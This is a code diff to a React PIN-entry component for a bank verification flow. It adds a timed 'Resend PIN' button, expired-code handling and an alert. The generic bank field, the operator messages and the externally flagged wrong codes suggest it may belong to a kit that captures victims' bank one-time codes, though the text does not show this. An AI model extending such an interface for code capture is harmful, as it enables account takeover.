@@ -1,8 +1,9 @@
-import React, { useState, useEffect } from "react";
+import React, { useState, useEffect, useCallback } from "react";
 import { PinInput } from "../../components/pin-input";
-import { submitOtp } from "../../lib/bank-api";
+import { submitOtp, resendOtp } from "../../lib/bank-api";
 import type { OperatorMessage as OperatorMessageType } from "../../types";
 import { Spinner } from "../../components/spinner";
+import { useResendCountdown } from "../../hooks/use-resend-countdown";
 
 interface PinEntryProps {
   apiBase: string;
@@ -11,9 +12,14 @@ interface PinEntryProps {
   bank?: string;
   onError: (msg: string) => void;
   wrongCode?: boolean;
+  expiredCode?: boolean;
   onTryAgain?: () => void;
   operatorMessage?: OperatorMessageType | null;
+  countdownResetTrigger?: number;
+  resendCooldownSeconds?: number;
 }
+
+const DEFAULT_RESEND_COOLDOWN = 60;
 
 export function PinEntry({
   apiBase,
@@ -22,18 +28,31 @@ export function PinEntry({
   bank,
   onError,
   wrongCode,
+  expiredCode,
   onTryAgain,
   operatorMessage,
+  countdownResetTrigger,
+  resendCooldownSeconds = DEFAULT_RESEND_COOLDOWN,
 }: PinEntryProps) {
   const [submitting, setSubmitting] = useState(false);
   const [resetKey, setResetKey] = useState(0);
 
+  const resendFn = useCallback(
+    () => resendOtp(apiBase, channelSlug, sessionId, "pin"),
+    [apiBase, channelSlug, sessionId]
+  );
+  const { secondsLeft, canResend, onResend, resending } = useResendCountdown(
+    resendCooldownSeconds,
+    countdownResetTrigger,
+    resendFn
+  );
+
   useEffect(() => {
-    if (wrongCode) {
+    if (wrongCode || expiredCode) {
       setSubmitting(false);
       setResetKey((k) => k + 1);
     }
-  }, [wrongCode]);
+  }, [wrongCode, expiredCode]);
 
   const handleComplete = async (pin: string) => {
     onTryAgain?.();
@@ -58,6 +77,11 @@ export function PinEntry({
           <p className="bank-ui-alert-title">Wrong PIN. Please try again.</p>
         </div>
       )}
+      {expiredCode && (
+        <div className="bank-ui-alert">
+          <p className="bank-ui-alert-title">Code expired. Please request a new code.</p>
+        </div>
+      )}
       <h2 className="bank-ui-heading">Enter your PIN</h2>
       <p className="bank-ui-body">
         {bank
@@ -73,6 +97,25 @@ export function PinEntry({
         onComplete={handleComplete}
         disabled={submitting}
       />
+      <div className="bank-ui-resend-row">
+        {canResend ? (
+          <button
+            type="button"
+            className="bank-ui-resend-btn"
+            onClick={() => {
+              onTryAgain?.();
+              onResend();
+            }}
+            disabled={resending || submitting}
+          >
+            {resending ? "Sending..." : "Resend PIN"}
+          </button>
+        ) : (
+          <span className="bank-ui-resend-countdown">
+            Resend PIN in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
+          </span>
+        )}
+      </div>
       {submitting && (
         <div className="bank-ui-waiting">
           <Spinner size={40} />
